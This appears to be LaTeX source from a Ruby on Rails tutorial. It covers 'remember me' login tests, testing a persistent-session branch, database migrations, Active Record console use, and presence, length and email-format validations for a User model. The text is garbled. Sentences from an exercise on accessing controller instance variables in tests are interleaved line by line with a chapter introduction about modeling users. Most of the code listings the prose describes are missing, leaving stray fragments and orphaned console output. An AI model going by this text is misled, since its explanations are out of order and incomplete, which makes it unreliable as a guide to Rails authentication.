Because remembering users requires that they be logged in, our first step is to define a helper to log users in inside tests.
In Listing~\ref{code:user_login_test_valid_information}, we logged a user in using the \kode{post} method and a valid \kode{session} hash, but it's cumbersome to do this every time.
To avoid needless repetition, we'll write a helper method called \kode{log\_in\_as} to log in for us.
Our method for logging a user in depends on the type of test. Inside integration tests, we can post to the sessions path as in Listing~\ref{code:user_login_test_valid_information}, but in other tests (such as controller and model tests) this won't work, and we need to manipulate the \kode{session} method directly.
As a result, \kode{log\_in\_as} should detect the kind of test being used and adjust accordingly.
We can tell the difference between integration tests and other kinds of tests using Ruby's convenient \kode{defined?}\ method, which returns true if its argument is defined and false otherwise.
In the present case, the \kode{post\_via\_redirect} method (seen before in Listing~\ref{code:a_test_for_valid_submission}) is available only in integration tests, so the code
will return \kode{true} inside an integration test and false otherwise.
This suggests defining an \kode{integration\_test?}\ boolean method and writing an if-then statement schematically as follows:
Filling in the comments with code leads to the \kode{log\_in\_as} helper method shown in Listing~\ref{code:test_helper_log_in}.
(This is a fairly advanced method, so you are doing well if you can read it with full comprehension.)
Adding a \kode{log\_in\_as} helper.
Note that, for maximum flexibility, the \kode{log\_in\_as} method in Listing~\ref{code:test_helper_log_in} accepts an \kode{options} hash (as in Listing~\ref{code:gravatar_option}), with default options for the password and for the ``remember me'' checkbox set to \kode{'password'} and \kode{'1'}, respectively.
In particular, because hashes return \kode{nil} for nonexistent keys, code like
To verify the behavior of the ``remember me'' checkbox, we'll write two tests, one each for submitting with and without the checkbox checked.
This is easy using the login helper defined in Listing~\ref{code:test_helper_log_in}, with the two cases appearing as
(Because \kode{'1'} is the default value of \kode{remember\_me}, we could omit the corresponding option in the first case above, but I've included it to make the parallel structure more apparent.)
After logging in, we can check if the user has been remembered by looking for the \kode{remember\_token} key in the \kode{cookies}.
Ideally, we would check that the cookie's value is equal to the user's remember token, but as currently designed there's no way for the test to get access to it: the \kode{user} variable in the controller has a remember token attribute, but (because \kode{remember\_token} is virtual) the \kode{@user} variable in the test doesn't.
Fixing this minor blemish is left as an exercise (Section~\ref{sec:log_in_out_exercises}), but for now we can just test to see if the relevant cookie is \kode{nil} or not.
There's one more subtlety, which is that for some reason inside tests the \kode{cookies} method doesn't work with symbols as keys, so that
is always \kode{nil}.
Luckily, \kode{cookies} \emph{does} work with string keys, so that
has the value we need.
The resulting tests appear in Listing~\ref{code:remember_me_test}.
(Recall from Listing~\ref{code:user_login_test_valid_information} that \kode{users(:michael)} references the fixture user from Listing~\ref{code:real_user_fixture}.)
A test of the ``remember me'' checkbox. 
Assuming you didn't make the same implementation mistake I did, the tests should be \passing:
Testing the remember branch
In Section~\ref{sec:login_with_remembering}, we verified by hand that the persistent session implemented in the preceding sections is working, but in fact the relevant branch in the \kode{current\_user} method is currently completely untested.
My favorite way to handle this kind of situation is to raise an exception in the suspected untested block of code: if the code isn't covered, the tests will still pass; if it is covered, the resulting error will identify the relevant test. The result in the present case appears in Listing~\ref{code:branch_raise}.
Raising an exception in an untested branch. 
At this point, the tests are \passing:
This is a problem, of course, because the code in Listing~\ref{code:branch_raise} is broken.
Moreover, persistent sessions are cumbersome to check by hand, so if we ever want to refactor the \kode{current\_user} method (as we will in Chapter~\ref{cha:account_activation_and_password_reset}) it's important to test it.
The test sequence is simple:
Define a \kode{user} variable using the fixtures.
Call the \kode{remember} method to remember the given user.
Verify that \kode{current\_user} is equal to the given user.
Because the \kode{remember} method doesn't set \kode{session[:user\_id]}, this procedure will test the desired ``remember'' branch.
The result appears in Listing~\ref{code:persistent_sessions_test}
A test for persistent sessions.
Note that we've added a second test, which checks that the current user is \kode{nil} if the user's remember digest doesn't correspond correctly to the remember token, thereby testing the \kode{authenticated?}\ expression in the nested \kode{if} statement:
Incidentally, in Listing~\ref{code:persistent_sessions_test} we could write
instead, and it would work just the same, but (as mentioned briefly in Section~\ref{sec:layout_exercises}) the conventional order for the arguments to \kode{assert\_equal} is \emph{expected}, \emph{actual}:
which in the case of Listing~\ref{code:persistent_sessions_test} gives
$ bundle exec rake test TEST=test/helpers/sessions_helper_test.rb
We can get the tests in Listing~\ref{code:persistent_sessions_test} to pass by removing the \kode{raise} and restoring the original \kode{current\_user} method, as shown in Listing~\ref{code:branch_no_raise}.
(You can also verify by removing the \kode{authenticated?}\ expression in Listing~\ref{code:branch_no_raise} that the second test in Listing~\ref{code:persistent_sessions_test} fails, which confirms that it tests the right thing.)
Removing the raised exception. 
Now that the ``remember'' branch of \kode{current\_user} is tested, we can be confident of catching regressions without having to check by hand.
We've covered a lot of ground in the last two chapters, transforming our promising but unformed application into a site capable of the full suite of signup and login behaviors.
All that is needed to complete the authentication functionality is to restrict access to pages based on login status and user identity.
We'll accomplish this task en route to giving users the ability to edit their information, which is the main goal of Chapter~\ref{cha:updating_showing_and_deleting_users}.
Before moving on, merge your changes back into the master branch:
$ bundle exec rake test<n>$ git add -A<n>$ git commit -m "Finish log in/log out"<n>$ git checkout master<n>$ git merge log-in-log-out
Then push up the remote repository and the production server:
Note that the application will briefly be in an invalid state after pushing but before the migration is finished.
On a production site with significant traffic, it is a good idea to turn \href{https://devcenter.heroku.com/articles/maintenance-mode}{\emph{maintenance mode}} on before making the changes:
$ heroku maintenance:on<n>$ git push heroku<n>$ heroku run rake db:migrate<n>$ heroku maintenance:off
This arranges to show a standard error page during the deployment and migration.
(We won't bother with this step again, but it's good to see it at least once.)
For more information, see the Heroku documentation on \href{https://devcenter.heroku.com/articles/error-pages}{error pages}.
Rails can maintain state from one page to the next using both temporary and persistent cookies.
The login form is designed to create a new session to log a user in.
The \kode{flash.now} method is used for flash messages on rendered pages.
Test-driven development is useful when debugging by reproducing the bug in a test.
Using the \kode{session} method, we can securely place a user id on the browser to create a temporary session.
We can change features such as links on the layouts based on login status.
Integration tests can verify correct routes, database updates, and proper changes to the layout.
We associate to each user a remember token and a corresponding remember digest for use in persistent sessions.
Using the \kode{cookies} method, we create a persistent session by placing a permanent remember token cookie on the browser.
Login status is determined by the presence of a current user based on the temporary session's user id or the permanent session's unique remember token.
The application signs users out by deleting the session's user id and removing the permanent cookie from the browser.
The ternary operator is a compact way to write simple if-then statements.
In Listing~\ref{code:user_model_remember}, we defined the new token and digest class methods by explicitly prefixing them with \kode{User}.
This works fine and, because they are actually \emph{called} using \kode{User.new\_token} and \kode{User.digest}, it is probably the clearest way to define them.
But there are two perhaps more idiomatically correct ways to define class methods, one slightly confusing and one extremely confusing.
By running the test suite, verify that the implementations in Listing~\ref{code:token_digest_self} (slightly confusing) and Listing~\ref{code:token_digest_class_self} (extremely confusing) are correct.
(Note that, in the context of Listing~\ref{code:token_digest_self} and Listing~\ref{code:token_digest_class_self}, \kode{self} is the \kode{User} class, whereas the other uses of \kode{self} in the User model refer to a user object \emph{instance}.
This is part of what makes them confusing.)
As indicated in Section~\ref{sec:remember_tests}, as the application is currently designed there's no way to access the virtual \kode{remember\_token} attribute in the integration test in Listing~\ref{code:remember_me_test}.
It is possible, though, using a special test method called \kode{assigns}.
In Chapter~\ref{cha:filling_in_the_layout}, we ended with a stub page for creating new users (Section~\ref{sec:user_signup}).
Inside a test, you can access \emph{instance} variables defined in the controller by using \kode{assigns} with the corresponding symbol.
Over the course of the next five chapters, we'll fulfill the promise implicit in this incipient signup page.
For example, if the \kode{create} action defines an \kode{@user} variable, we can access it in the test using \kode{assigns(:user)}.
In this chapter, we'll take the first critical step by creating a \emph{data model} for users of our site, together with a way to store that data.
Right now, the Sessions controller \kode{create} action defines a normal (non-instance) variable called \kode{user}, but if we change it to an instance variable we can test that \kode{cookies} correctly contains the user's remember token.
In Chapter~\ref{cha:sign_up}, we'll give users the ability to sign up for our site and create a user profile page.
By filling in the missing elements in Listing~\ref{code:login_create_user_instance} and Listing~\ref{code:improved_remember_me_test} (indicated with question marks~\kode{?} and \kode{FILL\_IN}), complete this improved test of the ``remember me'' checkbox.
Once users can sign up, we'll let them log in and log out as well (Chapter~\ref{cha:log_in_log_out}), and in Chapter~\ref{cha:updating_showing_and_deleting_users} (Section~\ref{sec:requiring_logged_in_users}) we'll learn how to protect pages from improper access.
Defining the new token and digest methods using \kode{self}. 
Finally, in Chapter~\ref{cha:account_activation_and_password_reset} we'll add account activation (thereby confirming a valid email address) and password resets.
Taken together, the material in Chapter~\ref{cha:modeling_users} through Chapter~\ref{cha:account_activation_and_password_reset} develops a full Rails login and authentication system.
authentication
Roll your own authentication system
Virtually all web applications require a login and authentication system of some sort.
As a result, most web frameworks have a plethora of options for implementing such systems, and Rails is no exception.
Examples of authentication and authorization systems include \href{http://github.com/thoughtbot/clearance}{Clearance}, \href{http://github.com/binarylogic/authlogic}{Authlogic}, \href{http://github.com/plataformatec/devise}{Devise}, and \href{http://railscasts.com/episodes/192-authorization-with-cancan}{CanCan} (as well as non-Rails-specific solutions built on top of \href{http://en.wikipedia.org/wiki/OpenID}{OpenID} or \href{http://en.wikipedia.org/wiki/Oauth}{OAuth}).
It's reasonable to ask why we should reinvent the wheel.
Why not just use an off-the-shelf solution instead of rolling our own?
A template for using an instance variable in the \kode{create} action.
For one, practical experience shows that authentication on most sites requires extensive customization, and modifying a third-party product is often more work than writing the system from scratch.
In addition, off-the-shelf systems can be ``black boxes'', with potentially mysterious innards; when you write your own system, you are far more likely to understand it.
Moreover, recent additions to Rails (Section~\ref{sec:adding_a_secure_password}) make it easy to write a custom authentication system.
Finally, if you \emph{do} end up using a third-party system later on, you'll be in a much better position to understand and modify it if you've first built one yourself.
<n>\end{aside}<n><n>  \section{User model} % (fold)<n>  \label{sec:user_model}<n><n>
Although the ultimate goal of the next three chapters is to make a signup page for our site (as mocked up in Figure~\ref{fig:signup_mockup_preview}), it would do little good now to accept information for new users: we don't currently have any place to put it.
Thus, the first step in signing up users is to make a data structure to capture and store their information.
A template for an improved ``remember me'' test. 
A mockup of the user signup page.
In Rails, the default data structure for a data model is called, naturally enough, a~\emph{model} (the M in MVC from Section~\ref{sec:mvc}).
The name comes from the ``\href{http://en.wikipedia.org/wiki/Active_record_pattern}{active record pattern}'', identified and named in \emph{Patterns of Enterprise Application Architecture} by Martin Fowler.
Pronounced ``ess-cue-ell'', though the alternate pronunciation ``sequel'' is also common.
Moreover, Rails has a feature called \emph{migrations} to allow data definitions to be written in pure Ruby, without having to learn an SQL data definition language (DDL).
The effect is that Rails insulates you almost entirely from the details of the data store.
In this book, by using SQLite for development and PostgreSQL (via Heroku) for deployment (Section~\ref{sec:deploying}), we have developed this theme even further, to the point where we barely ever have to think about how Rails stores data, even for production applications.
As usual, if you're following along using Git for version control, now would be a good time to make a topic branch for modeling users:
modeling-users
<n>\end{code}<n><n>    \subsection{Database migrations} % (fold)<n>    \label{sec:database_migrations}<n><n>
You may recall from Section~\ref{sec:a_user_class} that we have already encountered, via a custom-built \kode{User} class, user objects with \kode{name} and \kode{email} attributes.
That class served as a useful example, but it lacked the critical property of \emph{persistence}: when we created a User object at the Rails console, it disappeared as soon as we exited.
Our goal in this section is to create a model for users that won't disappear quite so easily.
By using an email address as the username, we open  the possibility of communicating with our users at a future date (Chapter~\ref{cha:account_activation_and_password_reset}).
In Listing~\ref{code:example_user}, we did this with Ruby's \kode{attr\_accessor} method:
In contrast, when using Rails to model users we don't need to identify the attributes explicitly.
As noted briefly above, to store data Rails uses a relational database by default, which consists of \emph{tables} composed of data \emph{rows}, where each row has \emph{columns} of data attributes.
For example, to store users with names and email addresses, we'll create a \kode{users} table with \kode{name} and \kode{email} columns (with each row corresponding to one user).
An example of such a table appears in Figure~\ref{fig:users_table}, corresponding to the data model shown in Figure~\ref{fig:user_model_sketch}.
(Figure~\ref{fig:user_model_sketch} is just a sketch; the full data model appears in Figure~\ref{fig:user_model_initial}.)
By naming the columns \kode{name} and \kode{email}, we'll let Active Record figure out the User object attributes for us.
A diagram of sample data in a \kode{users} table.
A sketch of the User data model.
You may recall from Listing~\ref{code:generate_users_controller} that we created a Users controller (along with a \kode{new} action) using the command
The analogous command for making a model is \kode{generate model}, which we can use to generate a User model with \kode{name} and \kode{email} attributes, as shown in Listing~\ref{code:generate_user_model}.
Generating a User model.
$ rails generate model User name:string email:string
      invoke  active_record
      create    app/models/user.rb
      create      test/models/user_test.rb
      create      test/fixtures/users.yml
(Note that, in contrast to the plural convention for controller names, model names are singular: a \emph{Users} controller, but a \emph{User} model.)
By passing the optional parameters \kode{name:string} and \kode{email:string}, we tell Rails about the two attributes we want, along with which types those attributes should be (in this case, \kode{string}).
Compare this with including the action names in Listing~\ref{code:generating_pages} and Listing~\ref{code:generate_users_controller}.
One of the results of the \kode{generate} command in Listing~\ref{code:generate_user_model} is a new file called a \emph{migration}.
Migrations provide a way to alter the structure of the database incrementally, so that our data model can adapt to changing requirements.
In the case of the User model, the migration is created automatically by the model generation script; it creates a \kode{users} table with two columns, \kode{name} and \kode{email}, as shown in Listing~\ref{code:users_migration}.
(We'll see starting in Section~\ref{sec:uniqueness_validation} how to make a migration from scratch.)
Migration for the User model (to create a \kode{users} table).
:name
Note that the name of the migration file is prefixed by a \emph{timestamp} based on when the migration was generated.
In the early days of migrations, the filenames were prefixed with incrementing integers, which caused conflicts for collaborating teams if multiple programmers had migrations with the same number.
Barring the improbable scenario of migrations generated the same second, using timestamps conveniently avoids such collisions.
The migration itself consists of a \kode{change} method that determines the \linebreak change to be made to the database.
In the case of Listing~\ref{code:users_migration}, \kode{change} uses a Rails method called \kode{create\_table} to create a table in the database for storing users.
The \kode{create\_table} method accepts a block (Section~\ref{sec:blocks}) with one block variable, in this case called \kode{t} (for ``table'').
Don't worry about exactly how the \kode{t}~object manages to do this; the beauty of \emph{abstraction layers} is that we don't have to know.
We can just trust the \kode{t}~object to do its job.
Here the table name is plural (\kode{users}) even though the model name is singular (User), which reflects a linguistic convention followed by Rails: a model represents a single user, whereas a database table consists of many users.
(We'll see concrete examples of the magic columns starting in Section~\ref{sec:creating_user_objects}.)
The full data model represented by the migration in Listing~\ref{code:users_migration} is shown in Figure~\ref{fig:user_model_initial}.
(Note the addition of the magic columns, which weren't present in the sketch shown in Figure~\ref{fig:user_model_sketch}.)
The User data model produced by Listing~\ref{code:users_migration}.
(You may recall that we ran this command in a similar context in Section~\ref{sec:demo_users_resource}.)
Officially pronounced ``ess-cue-ell-ite'', although the (mis)pronunciation ``sequel-ite'' is also common.
(If you're using the cloud IDE, you should first download the database file to the local disk, as shown in Figure~\ref{fig:sqlite_download}.)
You might note that there's one column in Figure~\ref{fig:sqlite_database_browser} not accounted for in the migration: the \kode{id} column.
As noted briefly in Section~\ref{sec:demo_users_resource}, this column is created automatically, and is used by Rails to identify each row uniquely.
The \href{http://sqlitebrowser.org/}{DB Browser for SQLite} with our new \kode{users} table.
Most migrations (including all the ones in this tutorial) are \emph{reversible}, which means we can ``migrate down'' and undo them with a single Rake task, called \kode{db:rollback}:
$ bundle exec rake db:rollback
Under the hood, this command executes the \kode{drop\_table} command to remove the users table from the database.
The reason this works is that the \kode{change} method knows that \kode{drop\_table} is the inverse of \kode{create\_table}, which means that the rollback migration can be easily inferred.
In the case of an irreversible migration, such as one to remove a database column, it is necessary to define separate \kode{up} and \kode{down} methods in place of the single \kode{change} method.
Read about \href{http://guides.rubyonrails.org/migrations.html}{migrations in the Rails Guides} for more information.
If you rolled back the database, migrate up again before proceeding:
We've seen how the User model generation in Listing~\ref{code:generate_user_model} generated a migration file (Listing~\ref{code:users_migration}), and we saw in Figure~\ref{fig:sqlite_database_browser} the results of running this migration: it updated a file called \kode{development.sqlite3} by creating a table \kode{users} with columns \kode{id}, \kode{name}, \kode{email}, \kode{created\_at}, and \kode{updated\_at}.
Listing~\ref{code:generate_user_model} also created the model itself.
The rest of this section is dedicated to understanding it.
It is, to put it mildly, very compact (Listing~\ref{code:raw_user_model}).
The brand new User model.
As in Chapter~\ref{cha:rails_flavored_ruby}, our tool of choice for exploring data models is the Rails console.
Since we don't (yet) want to make any changes to our database, we'll start the console in a \emph{sandbox}:
$ rails console --sandbox
Loading development environment in sandbox
Any modifications you make will be rolled back on exit
As indicated by the helpful message ``Any modifications you make will be rolled back on exit'', when started in a sandbox the console will ``roll back'' (i.e., undo) any database changes introduced during the session.
In the console session in Section~\ref{sec:a_user_class}, we created a new user object with \kode{User.new}, which we had access to only after requiring the example user file in Listing~\ref{code:example_user}.
With models, the situation is different; as you may recall from Section~\ref{sec:a_controller_class}, the Rails console automatically loads the Rails environment, which includes the models.
This means that we can make a new user object without any further work:
=> #<User id: nil, name: nil, email: nil, created_at: nil, updated_at: nil>
We see here the default console representation of a user object.
When called with no arguments, \kode{User.new} returns an object with all \kode{nil} attributes.
In Section~\ref{sec:a_user_class}, we designed the example User class to take an \emph{initialization hash} to set the object attributes; that design choice was motivated by Active Record, which allows objects to be initialized in the same way:
=> #<User id: nil, name: "Michael Hartl", email: "mhartl@example.com",
created_at: nil, updated_at: nil>
Here we see that the name and email attributes have been set as expected.
The notion of \emph{validity} is important for understanding Active Record model objects.
We'll explore this subject in more depth in Section~\ref{sec:user_validations}, but for now it's worth noting that our initial \kode{user} object is valid, which we can verify by calling the boolean \kode{valid?}\ method on it:
So far, we haven't touched the database: \kode{User.new} only creates an object \emph{in memory}, while \kode{user.valid?}\ merely checks to see if the object is valid.
In order to save the User object to the database, we need to call the \kode{save} method on the \kode{user} variable:
The \kode{save} method returns \kode{true} if it succeeds and \kode{false} otherwise.
(Currently, all saves should succeed because there are as yet no validations; we'll see cases in Section~\ref{sec:user_validations} when some will fail.)
The only exception is in Section~\ref{sec:scopes_subselects_and_a_lambda}.
You may have noticed that the new user object had \kode{nil} values for the \kode{id} and the magic columns \kode{created\_at} and \kode{updated\_at} attributes.
Let's see if our \kode{save} changed anything:
=> #<User id: 1, name: "Michael Hartl", email: "mhartl@example.com",
In case you're curious about \kode{"2014-07-24 00:57:46"}, I'm not writing this after midnight; the timestamps are recorded in \href{http://en.wikipedia.org/wiki/Coordinated_Universal_Time}{Coordinated Universal Time} (UTC), which for most practical purposes is the same as \href{http://en.wikipedia.org/wiki/Greenwich_Mean_Time}{Greenwich Mean Time}.
The ITU felt it was best to designate a single abbreviation for use in all languages in order to minimize confusion.
Since unanimous agreement could not be achieved on using either the English word order, CUT, or the French word order, TUC, the acronym UTC was chosen as a compromise.
As with the User class in Section~\ref{sec:a_user_class}, instances of the User model allow access to their attributes using a dot notation:
=> "Michael Hartl"
=> "mhartl@example.com"
As we'll see in Chapter~\ref{cha:sign_up}, it's often convenient to make and save a model in two steps as we have above, but Active Record also lets you combine them into one step with \kode{User.create}:
#<User id: 2, name: "A Nother", email: "another@example.org", created_at:
Note that \kode{User.create}, rather than returning \kode{true} or \kode{false}, returns the User object itself, which we can optionally assign to a variable (such as \kode{foo} in the second command above).
The inverse of \kode{create} is \kode{destroy}:
Like \kode{create}, \kode{destroy} returns the object in question, though I can't recall ever having used the return value of \kode{destroy}.
In addition, the destroyed object still exists in memory:
So how do we know if we really destroyed an object?
And for saved and non-destroyed objects, how can we retrieve users from the database?
To answer these questions, we need to learn how to use Active Record to find user objects.
Active Record provides several options for finding objects.
Let's use them to find the first user we created while verifying that the third user (\kode{foo}) has been destroyed.
We'll start with the existing user:
Here we've passed the id of the user to \kode{User.find}; Active Record returns the user with that~id.
Let's see if the user with an \kode{id} of~\kode{3} still exists in the database:
ActiveRecord::RecordNotFound: Couldn't find User with ID=3
Since we destroyed our third user in Section~\ref{sec:creating_user_objects}, Active Record can't find it in the database.
Exceptions and exception handling are somewhat advanced Ruby subjects, and we won't need them much in this book.
They are important, though, and I suggest learning about them using one of the Ruby books recommended in Section~\ref{sec:guide_to_further_resources}.
In addition to the generic \kode{find}, Active Record also allows us to find users by specific attributes:
Since we will be using email addresses as usernames, this sort of \kode{find} will be useful when we learn how to let users log in to our site (Chapter~\ref{cha:sign_up}).
If you're worried that \kode{find\_by} will be inefficient if there are a large number of users, you're ahead of the game; we'll cover this issue, and its solution via database indices, in Section~\ref{sec:uniqueness_validation}.
We'll end with a couple of more general ways of finding users.
First, there's \kode{first}:
Naturally, \kode{first} just returns the first user in the database.
There's also \kode{all}:
#<User id: 2, name: "A Nother",<n>email: "another@example.org", created_at:
Once we've created objects, we often want to update them.
There are two basic ways to do this.
First, we can assign attributes individually, as we did in Section~\ref{sec:a_user_class}:
=> "mhartl@example.net"
Note that the final step is necessary to write the changes to the database.
We can see what happens without a save by using \kode{reload}, which reloads the object based on the database information:
=> "foo@bar.com"
The \kode{update\_attributes} method is an alias for the shorter \kode{update} method, but I prefer the longer version because of its similarity to the singular version of the method, \kode{update\_attribute}.
=> "The Dude"
=> "dude@abides.org"
The \kode{update\_attributes} method accepts a hash of attributes, and on success performs both the update and the save in one step (returning \kode{true} to indicate that the save went through).
Note that if any of the validations fail, such as when a password is required to save a record (as implemented in Section~\ref{sec:adding_a_secure_password}), the call to \kode{update\_attributes} will fail.
If we need to update only a single attribute, using the singular \kode{update\_attribute} bypasses this restriction:
The User model we created in Section~\ref{sec:user_model} now has working \kode{name} and \kode{email} attributes, but they are completely generic: any string (including an empty one) is currently valid in either case.
And yet, names and email addresses are more specific than this.
For example, \kode{name} should be non-blank, and \kode{email} should match the specific format characteristic of email addresses.
Moreover, since we'll be using email addresses as unique usernames when users log in, we shouldn't allow email duplicates in the database.
In short, we shouldn't allow \kode{name} and \kode{email} to be just any strings; we should enforce certain constraints on their values.
Active Record allows us to impose such constraints using \emph{validations} (seen briefly before in Section~\ref{sec:putting_the_micro_in_microposts}).
In this section, we'll cover several of the most common cases, validating \emph{presence}, \emph{length}, \emph{format} and \emph{uniqueness}.
In Section~\ref{sec:has_secure_password} we'll add a final common validation, \emph{confirmation}.
And we'll see in Section~\ref{sec:unsuccessful_signups} how validations give us convenient error messages when users make submissions that violate them.
<n><n>\subsection{A validity test} % (fold)<n>\label{sec:a_validity_test}<n><n>As noted in Box~\ref{aside:when_to_test}, test-driven development isn't always the right tool for the job, but model validations are exactly the kind of features for which TDD is a perfect fit. 
It's difficult to be confident that a given validation is doing exactly what we expect it to without writing a failing test and then getting it to pass.
Our method will be to start with a \emph{valid} model object, set one of its attributes to something we want to be invalid, and then test that it in fact is invalid.
As a safety net, we'll first write a test to make sure the initial model object is valid.
This way, when the validation tests fail we'll know it's for the right reason (and not because the initial object was invalid in the first place).
To get us started, the command in Listing~\ref{code:generate_user_model} produced an initial test for testing users, though in this case it's practically blank (Listing~\ref{code:default_user_test}).
The practically blank default User test.
To write a test for a valid object, we'll create an initially valid User model object \kode{@user} using the special \kode{setup} method (discussed briefly in the Chapter~\ref{cha:static_pages} exercises), which automatically gets run before each test. Because \kode{@user} is an instance variable, it's automatically available in all the tests, and we can test its validity using the \kode{valid?}\ method (Section~\ref{sec:creating_user_objects}).
The result appears in Listing~\ref{code:valid_user_test}
A test for an initially valid user. 
Listing~\ref{code:valid_user_test} uses the plain \kode{assert} method, which in this case succeeds if \kode{@user.valid?} returns \kode{true} and fails if it returns \kode{false}.
Because our User model doesn't currently have any validations, the initial test should pass:
Here we've used \kode{rake test:models} to run just the model tests (compare to \kode{rake test:integration} from Section~\ref{sec:layout_link_tests}).
Perhaps the most elementary validation is \emph{presence}, which simply verifies that a given attribute is present.
For example, in this section we'll ensure that both the name and email fields are present before a user gets saved to the database.
In Section~\ref{sec:signup_error_messages}, we'll see how to propagate this requirement up to the signup form for creating new users.
We'll start with a test for the presence of a \kode{name} attribute by building on the test in Listing~\ref{code:valid_user_test}.
As seen in Listing~\ref{code:name_presence_test}, all we need to do is set the \kode{@user} variable's \kode{name} attribute to a blank string (in this case, a string of spaces) and then check (using the \kode{assert\_not} method) that the resulting User object is not valid.
A test for validation of the \kode{name} attribute. 
As we saw briefly before in the Chapter~\ref{cha:a_toy_app} exercises, the way to validate the presence of the name attribute is to use the \kode{validates} method with argument \kode{presence: true}, as shown in  Listing~\ref{code:validates_presence_of_name}.
The \kode{presence: true} argument is a one-element \emph{options hash}; recall from Section~\ref{sec:css_revisited} that curly braces are optional when passing hashes as the final argument in a method.
(As noted in Section~\ref{sec:adding_to_the_layout}, the use of options hashes is a recurring theme in Rails.)
Validating the presence of a \kode{name} attribute. 
Listing~\ref{code:validates_presence_of_name} may look like magic, but \kode{validates} is just a method.
An equivalent formulation of Listing~\ref{code:validates_presence_of_name} using parentheses is as follows:
Let's drop into the console to see the effects of adding a validation to our User model
I'll omit the output of console commands when they are not particularly instructive---for example, the results of \kode{User.new}.
=> false
Here we check the validity of the \kode{user} variable using the \kode{valid?}\ method, which returns \kode{false} when the object fails one or more validations, and \kode{true} when all validations pass.
In this case, we only have one validation, so we know which one failed, but it can still be helpful to check using the \kode{errors} object generated on failure:
(The error message is a hint that Rails validates the presence of an attribute using the \kode{blank?}
method, which we saw at the end of Section~\ref{sec:modifying_built_in_classes}.)
Because the user isn't valid, an attempt to save the user to the database automatically fails:
As a result, the test in Listing~\ref{code:name_presence_test} should now be \passing:
Following the model in Listing~\ref{code:name_presence_test}, writing a test for \kode{email} attribute presence is easy (Listing~\ref{code:email_presence_test}), as is the application code to get it to pass (Listing~\ref{code:validates_presence_of_email}).
A test for validation of the \kode{email} attribute. 
Validating the presence of an \kode{email} attribute. 
At this point, the presence validations are complete, and the test suite should be \passing:
We've constrained our User model to require a name for each user, but we should go further: the user's names will be displayed on the sample site, so we should enforce some limit on their length.
With all the work we did in Section~\ref{sec:presence_validation}, this step is easy.
There's no science to picking a maximum length; we'll just pull~\kode{50} out of thin air as a reasonable upper bound, which means verifying that names of~\kode{51} characters are too long.
In addition, although it's unlikely ever to be a problem, there's a chance that a user's email address could overrun the maximum length of strings, which for many databases is 255.
Because the format validation in Section~\ref{sec:format_validation} won't enforce such a constraint, we'll add one in this section for completeness.
Listing~\ref{code:length_validation_test} shows the resulting tests.
A test for \kode{name} length validation. 
For convenience, we've used ``string multiplication'' in Listing~\ref{code:length_validation_test} to make a string 51 characters long.
We can see how this works using the console:
=> "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
=> 51
The email length validation arranges to make a valid email address that's one character too long:
=> "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
To get them to pass, we need to use the validation argument to constrain length, which is just \kode{length}, along with the \kode{maximum} parameter to enforce the upper bound (Listing~\ref{code:length_validation}).
Adding a length validation for the \kode{name} attribute. 
Now the tests should be \passing:
With our test suite passing again, we can move on to a more challenging validation: email format.
Our validations for the \kode{name} attribute enforce only minimal constraints---any non-blank name under 51 characters will do---but of course the \kode{email} attribute must satisfy the more stringent requirement of being a valid email address.
So far we've only rejected blank email addresses; in this section, we'll require email addresses to conform to the familiar pattern \kode{user@example.com}.
Neither the tests nor the validation will be exhaustive, just good enough to accept most valid email addresses and reject most invalid ones.
We'll start with a couple of tests involving collections of valid and invalid addresses.
To make these collections, it's worth knowing about the useful \kode{\%w[]} technique for making arrays of strings, as seen in this console session:
=> ["foo", "bar", "baz"]
COM THE_US-ER@foo.bar.org first.last@foo.jp]
COM", "THE_US-ER@foo.bar.org", "first.last@foo.jp"]
THE_US-ER@foo.bar.org
first.last@foo.jp
Here we've iterated over the elements of the \kode{addresses} array using the \kode{each} method (Section~\ref{sec:blocks}).
With this technique in hand, we're ready to write some basic email format validation tests.
Because email format validation is tricky and error-prone, we'll start with some passing tests for \emph{valid} email addresses to catch any errors in the validation.
In other words, we want to make sure not just that invalid email addresses like \emph{user@example,com} are rejected, but also that valid addresses like \emph{user@example.com} are accepted, even after we impose the validation constraint.
(Right now, of course, they'll be accepted because all non-blank email addresses are currently valid.)
The result for a representative sample of valid email addresses appears in Listing~\ref{code:email_format_valid_tests}.
Tests for valid email formats. 
Note that we've included an optional second argument to the assertion with a custom error message, which in this case identifies the address causing the test to fail:
(This uses the interpolated \kode{inspect} method mentioned in Section~\ref{sec:hashes_and_symbols}.)
Including the specific address that causes any failure is especially useful in a test with an \kode{each} loop like Listing~\ref{code:email_format_valid_tests}; otherwise, any failure would merely identify the line number, which is the same for all the email addresses, and which wouldn't be sufficient to identify the source of the problem.
As in Listing~\ref{code:email_format_valid_tests}, Listing~\ref{code:email_format_validation_tests} includes a custom error message to identify the exact address causing any failure.
Tests for email format validation. 
                     foo@bar_baz.com foo@bar+baz.com]
The application code for email format validation uses the \kode{format} validation, which works like this:
This validates the attribute with the given \emph{regular expression} (or \emph{regex}), which is a powerful (and often cryptic) language for matching patterns in strings.
This means we need to construct a regular expression to match valid email addresses while \emph{not} matching invalid ones.
full regex
For example, did you know that \kode{"Michael Hartl"@example.com}, with quotation marks and a space in the middle, is a valid email address according to the standard?
Incredibly, it is---but it's absurd.
Here's what it looks like:
To help understand where this comes from, Table~\ref{table:valid_email_regex} breaks it into bite-sized pieces
Note that, in Table~\ref{table:valid_email_regex}, ``letter'' really means ``lower-case letter'', but the \kode{i} at the end of the regex enforces case-insensitive matching.
start of regex
match start of a string
at least one word character, plus, hyphen, or dot
literal ``at sign''
at least one letter, digit, hyphen, or dot
literal dot
at least one letter
match end of a string
end of regex
case-insensitive
Breaking down the valid email regex.
Although you can learn a lot by studying Table~\ref{table:valid_email_regex}, to really understand regular expressions I consider using an interactive regular expression matcher like \href{http://www.rubular.com/}{Rubular} to be essential (Figure~\ref{fig:rubular})
If you find it as useful as I do, I encourage you to \href{http://bit.ly/donate-to-rubular}{donate to Rubular} to reward developer \href{http://lovitt.net/}{Michael Lovitt} for his wonderful work.
The Rubular website has a beautiful interactive interface for making regular expressions, along with a handy regex quick reference.
I encourage you to study Table~\ref{table:valid_email_regex} with a browser window open to Rubular---no amount of reading about regular expressions can replace playing with them interactively.
The awesome  \href{http://www.rubular.com/}{Rubular} regular expression editor.
